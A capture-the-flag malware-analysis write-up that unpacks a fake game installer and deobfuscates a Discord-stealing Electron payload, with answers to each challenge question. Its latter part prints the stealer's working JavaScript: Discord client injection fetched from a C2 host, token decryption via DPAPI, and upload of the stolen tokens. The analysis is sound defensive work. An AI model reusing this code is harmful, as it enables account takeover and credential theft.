# Subatomic
> Write-up author: jon-brandy

![image](https://github.com/user-attachments/assets/7619feaa-40d4-4b8d-8cd5-5fe71e5a31d1)


## Lessons Learned:
1. Using `Detect it Easy (DIE)` to identify file type.
2. Unpacking Nullsoft Installer binary.
3. Identifying unique GUID used by the malware for installation.
4. Debugging obfuscated javascript file using VSCODE (to retrieve the deobfuscated JS).
5. Small code review for JS source file.

## SCENARIO:

<p align="justify">Forela is in need of your assistance. They were informed by an employee that their Discord account had been used to send a message with a link to a file they suspect is malware. The message read: "Hi! I've been working on a new game I think you may be interested in it. It combines a number of games we like to play together, check it out!". The Forela user has tried to secure their Discord account, but somehow the messages keep being sent and they need your help to understand this malware and regain control of their account! Warning: This is a warning that this Sherlock includes software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments. One the Sherlock zip has been unzipped, you will find a DANGER.txt file. Please read this to proceed.</p>

## STEPS:
1. A Discord account has been compromised and is being used to send messages containing a link to a suspected malicious file. Despite the owner's efforts to secure the account, the messages continue to be sent.
2. As forensic analysts, our task is to investigate the incident and analyze the malware to understand its behavior and regain control of the account.
3. Unzipping the zip file shall resulting to 2 files. Those are **.txt** file and the zipped malware binary.

![image](https://github.com/user-attachments/assets/a4859d6d-4738-4fcb-a8df-9ae2ea0505c8)

> Danger.txt

![image](https://github.com/user-attachments/assets/15b5fe39-d4d5-4e41-bf8f-37fe7b691e37)


4. Unzipping the **malware.zip** file using the provided password, shall resulting to a binary named **nsis-installer.exe**.

![image](https://github.com/user-attachments/assets/3d5ea2ad-681b-409a-b80f-928fc65a8c20)

5. Anyway, this is interesting because upon checking the file **properties** found `Unauthenticated Attributes`. This finding could indicate that there is additional data in the file that was not included in Microsoft's signing process.
6. It indicates a masquerading technique.

![image](https://github.com/user-attachments/assets/36a457f4-02de-4837-820b-b4dc6649a9be)

7. As an additional information, another tool like `Detect it Easy (DIE)` is useful to identify the actual file type of a file.

![image](https://github.com/user-attachments/assets/be0b0f89-1b04-4d59-a772-0bb7acb19924)


#### NOTE:

```
Nullsoft Scriptable Install System (NSIS) is a professional open source system
to create windows installers.
```

> 1ST QUESTION --> ANS: b34f154ec913d2d2c435cbd644e91687

![image](https://github.com/user-attachments/assets/410dbded-ea3d-4810-85a7-f1ab96265ef3)


5. To identify the **imphash** of this malware installer, we can simply grab the checksum and load it at virus total.
6. In **Window Powershell** terminal, we can use this command:

```
Get-Filehash .\nsis-installer.exe -Algorithm <checksum_you_want>
```

![image](https://github.com/user-attachments/assets/2eb19355-bad4-4fcb-8960-62a2b7bba0eb)


> RESULT AT VIRUS TOTAL

![image](https://github.com/user-attachments/assets/2dd3e64c-1db4-400b-ac31-7c80f88e1bbd)


7. To identify the **imphash**, simply check the **Details** tab and view the **Basic Properties** section.

![image](https://github.com/user-attachments/assets/915008cb-6762-4c81-a15b-7de3e4288fc3)


> 2ND QUESTION --> ANS: Windows Update Assistant

![image](https://github.com/user-attachments/assets/5de05f00-3bc8-4a96-a66f-3a1673754327)

8. It is known that the malware contains a digital signature and to identify the program name specified under the `SpcSpOpusInfo` Data Structure we can review the **Signature Info** section at Virus Total.
9. Viewing information under `SpcSpOpusInfo` it is clear the program name is `Windows Update Assistant`.

![image](https://github.com/user-attachments/assets/b7903e58-f60d-486a-800d-ed9c862e1e65)


> 3RD QUESTION --> ANS: `cfbc383d-9aa0-5771-9485-7b806e8442d5`

![image](https://github.com/user-attachments/assets/4131d86e-5199-45b8-920c-396c49305b96)

10. Next, to identify the unique GUID used by the malware during installation, we need to interact with the binary.
11. Since previously we identified the binary file type is indeed an `nsis`, hence it contains a compressed installation files.

#### NOTE:

```
Many installers (NSIS, MSI, Inno Setup, etc) compress their
payload (the files to be installed) to save space.
```

12. Upon listing all the compressed files using `7z`, found an interesting archive file. The archive itself could indicates a bundled payload compressed for efficiency.
13. `$PLUGINSDIR` is a temporary directory created and used by NSIS when an installer runs. It is used to extract and store temporary files, such as plugins, resources, or payloads required during the installation process.
14. The contents of `$PLUGINSDIR` are typically deleted after the installer finishes running, unless the process is interrupted or the files are explicitly left behind.

> COMMAND

```
7z l nsis-installer.exe
```

![image](https://github.com/user-attachments/assets/525b0cd6-2d24-4cfa-9ca8-825c0515ebe2)



15. It is known there are 2 directories and 72 files within the archive file.

![image](https://github.com/user-attachments/assets/858464d4-4ed6-47c0-97e9-868431c04af0)

16. Noticed there is another archive file with `.asar` extension, the size itself is quite big, which indicate storing important data.

![image](https://github.com/user-attachments/assets/62c2fc3d-abd7-40b3-a855-de72c1d99aa8)

17. Anyway, previously we identified another `.nsi` file which should be our interest beside the 7zip archive file. The `.nsi` file is part of the NullSoft installer, this file has instructions about the installation process of the binary.
18. Knowing this, the unique GUID used by the malware for installation process can be found there. To review it we can simply open it on any text editor.

> RESULT ON NOTEPAD++

![image](https://github.com/user-attachments/assets/78a0f56f-df78-4f62-939a-15e442a71229)


19. It seems, **SerenityThrerapyInstaller** should be our interest.

![image](https://github.com/user-attachments/assets/a9ca6eb5-cd79-4672-a88a-70047ad23398)

20. However noticed there are several keys that reference to GUID `cfbc383d-9aa0-5771-9485-7b806e8442d5`. An uninstall instruction is also reference to the same GUID along with the publisher name stated the **SerenityTherapyInstaller**.
21. For the sake of consistency in registry entries, the GUID associated for the uninstallation is typically the same as the one used during installation.
22. Another reason why it used the same GUID is to avoid conflict with other installations.

![image](https://github.com/user-attachments/assets/b05e39a3-f671-457b-a174-4c96cb25bdd5)


> 4TH QUESTION --> ANS: `ISC`

![image](https://github.com/user-attachments/assets/87cfee9b-69f2-4243-900f-3397b8f18397)


23. Refer back to our previous finding upon unzipping the 7zip archive file, we shall review the `app.asar` file.

![image](https://github.com/user-attachments/assets/226e5fe6-4cbd-40b1-bcc4-c006a5b32f91)

24. Interesting! It seems the malware is using JS utility.
25. Reviewing the **JSON** file, we can identify several metadata associated with the malware and one of them is the license tied to this malware.

![image](https://github.com/user-attachments/assets/4a5a3237-fcf9-4804-9ceb-7e61d37de606)


> 5TH QUESTION --> ANS: `illitmagnetic.site`

![image](https://github.com/user-attachments/assets/32b38bf1-d4cf-48a4-b8ee-5d51248508ce)


26. Upon reviewing the Javascript, it is clear that the script is obfuscated and it would take time if we try to conduct static analysis to the JS file.

![image](https://github.com/user-attachments/assets/17f663f7-92b0-4919-b687-dbeb131e2033)

27. So I tried to debug the JS using VSCODE. Anyway don't forget to install all the dependencies we previously identified in order to debug the script. In my case, I just missing both `@primno/dpapi` and `sqlite3` npm modules, if you facing the same problem, here lies the command line to install those two modules.

> Command to install

```sh
npm install @primno/dpapi
npm install sqlite3
```

> Don't forget to beautify the script first, so we can easily fix for syntax error

![image](https://github.com/user-attachments/assets/d79e6d70-9ecf-4931-b1c8-5e2647b85f70)

29. If you face the same syntax problem like me, simply remove the **5** number before **_0**.

> BEFORE

![image](https://github.com/user-attachments/assets/36d607d5-6c03-469d-8143-2422cf374a99)


> AFTER

![image](https://github.com/user-attachments/assets/58476ed9-9d3d-420d-9de4-f8204a97d530)


30. I am running several pause and unpause during the debug process, until I found the **eval** statement. Opening it shall resulting to a 894 LOCs which **might** be comes from the obfuscated script. However things to note that it's kinda tricky to get the **eval** statement at the **call stack** section, because if you paused too early / late, the **eval** statement won't be visible at the **call stack** section.
31. So I did several try to identify any statement that is convincing, maybe there is a foo way regarding this.
 
![image](https://github.com/user-attachments/assets/75d3949e-a3c4-41b3-bf37-b0a52ba5d07a)

32. Upon reviewing the script, found an object named **options** which contains several keys, such as **api**, **user_id**, and **logout_discord**.

![image](https://github.com/user-attachments/assets/16e5ceb3-7b7e-4116-8078-0298e38492ed)


33. Checking the domain on threat intelligence platform, the API domain name is marked as malicious and the domain name is prone to as the C2 domain used by the malware.

![image](https://github.com/user-attachments/assets/e5c24d76-f480-4ce5-897e-2734a76663ed)



> 6TH QUESTION --> ANS: `https://ipinfo.io/json`

![image](https://github.com/user-attachments/assets/4fb2fde3-b386-4402-8d00-fa3e71bfd8f4)

34. Continue reviewing the deobfuscated script, found another object named **networks** which fetch to URL that is likely used to identify public IP information of the infected machine.

![image](https://github.com/user-attachments/assets/f31c5b12-66bf-4105-a476-98399633f844)



> 7TH QUESTION --> ANS: `https://illitmagnetic.site/api/`

![image](https://github.com/user-attachments/assets/8d3f126d-7893-4c2c-bad0-0701b26ee91d)


35. For better code review, we can see all of the functions listed at the **OUTLINE** section. It should gave us a grasp regarding functions related to **Discord**, **Browser**, and **General**.

![image](https://github.com/user-attachments/assets/fb4949e9-66c6-45e2-9974-ebb1ae326e1e)

36. Based on the functions listed at **Outline**, it seems there are 4 functions that could give us answer regarding the particular path used by the malware to connect back on.

![image](https://github.com/user-attachments/assets/e23dd10a-3938-4dc4-9b3a-6cd73e54f534)


> FOUND 3 try / catch blocks

|First Block|Second Block|Third Block|
|:---------:|:----------:|:---------:|
|![image](https://github.com/user-attachments/assets/c06ae0f9-9c6e-4a20-8e6c-db9625472d29)|![image](https://github.com/user-attachments/assets/900990f9-bae0-49f8-a260-ae67339fb0a3)|![image](https://github.com/user-attachments/assets/3d8948ee-b89e-4020-b55c-a780d91750b6)|

37. Noticed that the logic for **catch** is the same for each but the error message is quite different.
38. Based on the script above, the first block calls three functions, those are **checkVM()**, **checkCmdInstallation()**, and **newInjection()**. The second block calls **getDiscordTokens()** function and the third block calls **allBrowserData()** function.
39. Anyway, each catch block does show that the **api** key from the **options** object is called again. It concludes the same C2 is called again for this malware.

![image](https://github.com/user-attachments/assets/0fd66a9b-701d-42a3-b747-2b7595a89990)


> 8TH QUESTION --> ANS: duvet_user

![image](https://github.com/user-attachments/assets/9191e24b-562f-490a-b4a9-c6fa306cf94a)


40. Again, based from the same code-block, we can identify the variable name which act as a **user_id** key.

![image](https://github.com/user-attachments/assets/5c5f249e-11a6-43b8-87a1-c1c389b60e31)


> 9TH QUESTION --> ANS: `archibaldpc`

![image](https://github.com/user-attachments/assets/cad17c45-bb9a-4d48-a6ed-a3034d6eb855)

41. To identify what hostname begins with **arch**, we can refer to line **19** which contains all the **hostnames** that the malware checks upon execution.

![image](https://github.com/user-attachments/assets/5b55181d-bd1d-47c5-a132-6043d819a01d)


> 10TH QUESTION --> ANS: `vmwaretray`

![image](https://github.com/user-attachments/assets/7893cb57-ef91-43d4-b3df-5a79a0c81e45)

42. Just below the previous code-block, we can see number of processes checked by the malware to see if they are running in a VM.
43. Noticed the same process gets checked twice --> **vmwaretray**.

![image](https://github.com/user-attachments/assets/8fd94a09-0943-4923-b4bf-c538c72a5aed)


> 11TH QUESTION --> ANS: `%USERPROFILE%\Documents\cmd.exe`

![image](https://github.com/user-attachments/assets/254bb4b9-423d-4069-a2c8-3c3faa0ca93c)

44. Referring to the **OUTLINE** section at VSCODE, we can identify a spesific function which relevant with **cmd**.

![image](https://github.com/user-attachments/assets/6d0f4eb0-3eb3-4e27-960a-2d0dd8ab4db6)


45. In summary, the script above ensure whether **cmd.exe** binary is available and update the environment's command processor path accordingly.
46. If the **cmd.exe** binary is not exist, it will write a file from the C2 server to **Document** directory using the environment variable `USERPROFILE`.

> 12TH QUESTION --> ANS: `where /r . cookies.sqlite`

![image](https://github.com/user-attachments/assets/b8921284-21c9-413f-a332-78432de9550e)

47. Again, using the same method by referring to the **OUTLINE** section, we can identify a function named `getFirefoxCookies()`, which used to steal cookies from firefox.

![image](https://github.com/user-attachments/assets/1a0159b3-1a60-4ebf-b1ad-441ff10a38dc)

> getFirefoxCookies()

![image](https://github.com/user-attachments/assets/5c028c5c-5764-464e-9413-375ae4884e46)


48. Based on the script above, **getFirefoxCookies()** function uses command `where /r . cookies.sqlite` to find the database file.
49. Afterwards, if the file is found then it collects all the data from the DB, then return it.


> 13TH QUESTION --> ANS: `discord_desktop_core-1, index.js`

![image](https://github.com/user-attachments/assets/54ed6588-8c39-422f-b6d8-466d6ba9fdc3)

50. To identify what Discord module has been modified by the malware, we need to review all functions related to Discord.
51. Referring to the **OUTLINE** section, we can identify several functions related to Discord, those are:

```
1. discordInjection.
2. newInjection.
```

> discordInjection()

```js
async function discordInjection() {
    const infectedDiscords = [];

    [join(process.env.LOCALAPPDATA, 'Discord'), join(process.env.LOCALAPPDATA, 'DiscordCanary'), join(process.env.LOCALAPPDATA, 'DiscordPTB')]
    ?.forEach(async(dir) => {
        if(existsSync(dir)) {
            if(!readdirSync(dir).filter((f => f?.startsWith('app-')))?.[0]) return;
            const path = join(dir, readdirSync(dir).filter((f => f.startsWith('app-')))?.[0], 'modules', 'discord_desktop_core-1');
            const discord_index = execSync('where /r . index.js', { cwd: path })?.toString()?.trim();
            
            if(discord_index) infectedDiscords?.push(
                dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')
            );

            const request = await fetch(options.api + 'injections', {
                method: 'GET',
                headers: {
                    duvet_user: options?.user_id,
                    logout_discord: options?.logout_discord
                }
            });

            const data = await request.json();

            writeFileSync(discord_index, data?.discord, {
                flag: 'w'
            });

            await kill(['discord', 'discordcanary', 'discorddevelopment', 'discordptb']);
            exec(`${join(dir, 'Update.exe')} --processStart ${dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')}.exe`, function(err) {
                if(err) {};
            });
        };
    });

    return infectedDiscords;
};
```

52. Based on the script above, at the beginning it loops through each standard installation directories for Discord (Discord, Discord Canary, and Discord PTB). Next, it check for subdirectories starting with `app-` which correspond to specific Discord versions, then constructs a path to the `discord_desktop_core-1` module folder, a common location for Discord's core functionality. 

```js
// Find Discord App Version
if(!readdirSync(dir).filter((f => f?.startsWith('app-')))?.[0]) return;
const path = join(dir, readdirSync(dir).filter((f => f.startsWith('app-')))?.[0], 'modules', 'discord_desktop_core-1');
```

53. Later on, it checks for existing installations, locates the `index.js` file in Discord's core module directory, then fetches a payload from a specified API to overwrite the file (injecting malicious code).

```js
// locate index.js file
const discord_index = execSync('where /r . index.js', { cwd: path })?.toString()?.trim();
```

```js
const request = await fetch(options.api + 'injections', {
    method: 'GET',
    headers: {
        duvet_user: options?.user_id,
        logout_discord: options?.logout_discord
    }
});
const data = await request.json();
```

55. After modifying the file, the script forcibly terminates running Discord processes and restarts them using Discord's **Update.exe**  to ensure the injected code is loaded.

```js
writeFileSync(discord_index, data?.discord, {
    flag: 'w'
});

await kill(['discord', 'discordcanary', 'discorddevelopment', 'discordptb']);
exec(`${join(dir, 'Update.exe')} --processStart ${dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')}.exe`, function(err) {
    if(err) {};
});
```

56. Nice! At this rate we know the first solution is to clean up the `discord_desktop_core-1` module's --> `index.js` source file.

> getDiscordTokens()

```js
async function getDiscordTokens() {
    const request = await fetch(options.api + 'paths', {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json',
            'duvet_user': options.user_id
        }
    });
    
    const paths = await request.json();
    const tokens_list = [];

    for(const [key, value] of Object.entries(paths.discordTokens)) {
        const path = value.replace('appdata', process.env.LOCALAPPDATA).replace('roaming', process.env.APPDATA);

        if(existsSync(path) && existsSync(join(path, '..', '..', 'Local State'))) {
            for(const file of readdirSync(path)) {
                if(file?.endsWith('.ldb')  || file?.endsWith('.log')) {
                    if(!existsSync(join(path, file))) return;

                    const file_content = readFileSync(join(path, file), 'utf-8')
                    .split('\n')?.map((x) => x?.trim());

                    file_content?.forEach((line) => {
                        const encrypted_tokens = line?.match(/dQw4w9WgXcQ:[^.*['(.*)'\].*$][^']*/gi);
                        if(encrypted_tokens) {
                            encrypted_tokens?.forEach(async(token) => {
                                if(token?.endsWith('\\')) token = (token?.slice(0, -1).replace('\\', ''))?.slice(0, -1);
                                const encrypted_key = Buffer.from(JSON.parse(readFileSync(join(path, '..', '..', 'Local State')))?.os_crypt?.encrypted_key, 'base64').slice(5);
                                const decrypted_key = Dpapi?.unprotectData(Buffer.from(encrypted_key, 'utf-8'), null, 'CurrentUser');
                                if(!decrypted_key) return;

                                let decrypted_token;

                                const encrypted = Buffer.from(token?.split(':')[1], 'base64');
                                if(!encrypted) return;

                                const start = encrypted?.slice(3, 15), 
                                middle = encrypted?.slice(15, encrypted?.length - 16),
                                end = encrypted?.slice(encrypted?.length - 16, encrypted?.length);
                            
                                if(decrypted_key.byteLength >= 64) return;

                                if(start?.length !== 12) return;
                                const cipher = createCipheriv('aes-256-gcm', decrypted_key, start)
                                let encryptedData = cipher.update(middle, 'base64', 'utf-8');
                                encryptedData += cipher.final('utf-8');

                                decrypted_token = encryptedData;
                                if(!tokens_list?.find((t) => t?.token === decrypted_token)) {
                                    tokens_list.push({
                                        token: decrypted_token,
                                        found_in: key,
                                        auth_tag_length: end.length,
                                        crypto_iv: start?.length
                                    });
                                };
                            });
                        };
                    });
                };
            };
        } else if(existsSync(path)  && !existsSync(join(path, '..', '..', 'Local State'))) {
            for(const file of readdirSync(path)) {
                if(file?.endsWith('.ldb') || file?.endsWith('.log')) {
                    const file_content = readFileSync(join(path, file), 'utf-8')?.split(/\r?\n/);
                    file_content?.forEach((line) => {
                        for(const regex of [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)]) {
                            const matched_tokens = line?.match(regex);
                            if(matched_tokens) {
                                matched_tokens?.forEach(async(token) => {
                                    if(!tokens_list?.find((t) => t?.token === token)) {
                                        tokens_list?.push({
                                            token: token,
                                            found_in: key
                                        });
                                    };
                                });
                            };
                        };
                    });
                };
            };
        } else {
            continue;
        };
    };

    const merge = (a, b, predicate = (a, b) => a === b) => {
        const c = [...a];
        b?.forEach((bItem) => (c?.some((cItem) => predicate(bItem, cItem)) ? null : c?.push(bItem)))
        return c;
    };

    const firefox_tokens = await stealFirefoxTokens();

    const valid_tokens = [];
    for(const value of merge(tokens_list, firefox_tokens)) {
        const token_data = await checkToken(value?.token);

        if(token_data?.id) {
            const user_data = await tokenRequests(value?.token, token_data?.id);
            if(!valid_tokens.find((u) => u?.user?.data?.id === token_data.id)) {
                valid_tokens.push({
                    token: value?.token,
                    found_at: value?.found_in,
                    auth_tag_length: value?.auth_tag_length,
                    crypto_iv: value?.crypto_iv,
                    user: {
                        data: token_data,
                        profile: user_data?.profile,
                        payment_sources: user_data?.payment_sources
                    }
                });
            };
        };
    };
    
    if(valid_tokens?.length) {
        fetch(options.api + 'valid-tokens', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                duvet_user: options?.user_id,
                valid_tokens,
                computer_name: userInfo()?.username
            })
        });
    };
};
```

57. In short, this function is used to extract and decrypt Discord authentication tokens from a system. It attempts to steal Discord auth tokens by fetching paths from an API and scanning the system for `.ldb` and `.log` files within the specified directories.
58. This function also calls another function like **stealFirefoxTokens** to gather tokens from other sources and ensures all tokens are checked and merged into a single list before being sent to the threat actor.
59. Long story short I did not find any Discord related function other than `discordInjection()` that infected a file. This conclude the module infected is `discord_desktop_core-1` and the file name infected is `index.js`.
60. Awesome! We have investigated the case!


## IMPORTANT LINK(S):

```

```
